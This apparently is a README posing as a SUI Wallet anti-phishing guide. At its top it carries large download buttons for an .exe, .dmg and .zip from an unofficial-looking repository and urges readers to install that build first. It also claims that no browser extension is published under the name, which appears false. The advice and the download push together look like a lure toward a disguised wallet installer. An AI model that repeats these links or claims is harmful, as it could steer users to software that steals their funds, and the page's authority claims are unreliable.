![SUI Wallet](assets/banner-article.png)

# Avoiding SUI Wallet phishing sites

Every wallet attack starts with a page that looks like the page you meant to visit.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Every attempt against this wallet needs one of three things: a download, a phrase or a signature. The
product asks for the first from one place only, never asks for the second, and shows the third in a window
that names the site making the request. Any message wanting one of the three is the attack.

## The three things an attacker wants

A wallet attack is not a clever piece of code. It is a request that looks routine, aimed at one of the
three things that give a stranger access: a file you will run, the words that control the account, or a
signature you will approve without reading it.

Knowing the list changes how a message reads. An email offering a security update is asking for the first.
A "support agent" asking you to confirm your phrase is asking for the second. A site asking you to connect
and approve "to verify" is asking for the third. None of them needs a technical examination once the ask is
visible.

## Fake downloads and lookalike names

The download is the first target because it runs before any wallet code exists, so nothing inside the app
can warn you afterwards. The copies are made well: the same screenshots, the same colours, a domain one
character away from the real one, or a word added to the product name.

Structural tells separate a copy from the release. The real page lists three files with their sizes and
SHA-256 values and links to a repository with an [Apache-2.0 licence](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/main/LICENSE). A copy lists one prominent download
button, adds counters and testimonials, and has no repository behind it.

[verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) walks the digest comparison, which is the check that
settles it even when the page is a convincing copy of the real one.

## The phrase request that is always a scam

The 24 words appear in two places in this product's life: creation, where the app shows them, and restore,
where you type them. Nothing else in the app asks, and no person asks at all - not a support agent, not a
moderator, not a friend whose account just messaged you out of the blue.

That gives a rule with no exceptions worth entertaining. A message that requests the phrase is a scam, and
the only question left is how fast you stop reading. It does not matter who it appears to be from, how it
was sent, or what it offers to fix - the request itself is the tell, and a real support channel never
makes it.

[Someone has my SUI Wallet seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/someone-has-my-sui-wallet-seed-phrase.md) covers what to do if the words have already gone out.

## Signature prompts and what the window shows

A signature is the one action that can actually move funds, so the window that requests it is the place to
slow down. The app previews the transaction in human-readable terms before you sign, and a request from a
connected site names the site and the account it will act on.

Three patterns are worth recognising. A site that asks you to sign something you did not initiate. A
preview whose effect does not match what the site said it would do. And a request that arrives while you
are looking at a different tab, which is why the window naming the site matters more than the page behind
it.

Declining costs nothing. A site that needs a signature can ask again; a signature that was approved
cannot be withdrawn.

## The support channel and what it never asks for

This project runs one support channel, and it is named in the README and in the app. That is deliberate:
one channel is one thing to verify, and every message claiming to be from a different one is a message
worth ignoring.

The channel never asks for a seed phrase, never asks you to install a "fix", and never asks you to approve
a transaction to prove ownership. Anything shaped like those requests is somebody borrowing the name.

## Unsolicited tokens and airdrops

Tokens that appear in a wallet without being sent for are a message, not a gift. The usual shape is a
worthless token with a name designed to make you look it up, plus a link in the metadata pointing at a
site that asks you to connect.

The token itself is not the danger; the link is. Ignoring an unwanted token costs nothing, and no legitimate
project needs you to visit a site to "claim" something you were not expecting.

## If a phrase was already typed into a site

Move the funds first. A fresh account, a fresh phrase, and the balance sent to it, before any reporting or
investigation. The words cannot be un-shared, and time spent deciding is time the other party has to move
it first.

Then treat the old account as burned permanently, even if it still looks empty. Once the exposure has
happened, the account's only remaining use is as a place to leave nothing.

## FAQ

### Does SUI Wallet support staff ever ask for my seed phrase?

No, and no legitimate channel would. The phrase appears at creation and at restore, and nowhere else. A
request for it identifies the sender immediately.

### How can you tell if someone is a crypto scammer?

By the ask rather than by the story. Requests for a phrase, for a signature on something you did not
initiate, or for an install from anywhere but the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) are the three shapes, and each one is
enough on its own.

### How do I spot a fake crypto wallet?

A fake rarely shows its release page, because there is no release behind it. Check for the three files
with their digests, a repository, and an Apache-2.0 licence; a page with none of those is not the product.

### Is this the legit browser extension for Sui Wallet?

This project publishes a desktop application from its own GitHub account and does not publish a browser
extension. An extension using the name comes from somebody else, whichever store it sits in.

### Are unsolicited airdropped tokens legit?

Treat them as advertising at best and bait at worst. The token is harmless to ignore; the link that comes
with it is the part designed to take something from you.

### What if I already approved a transaction I did not understand?

Check the diagnostics panel for the last transaction digest and treat the account as exposed: create a
fresh account, move what remains, and stop using the old one. Approval is the one mistake that cannot be
undone by updating.
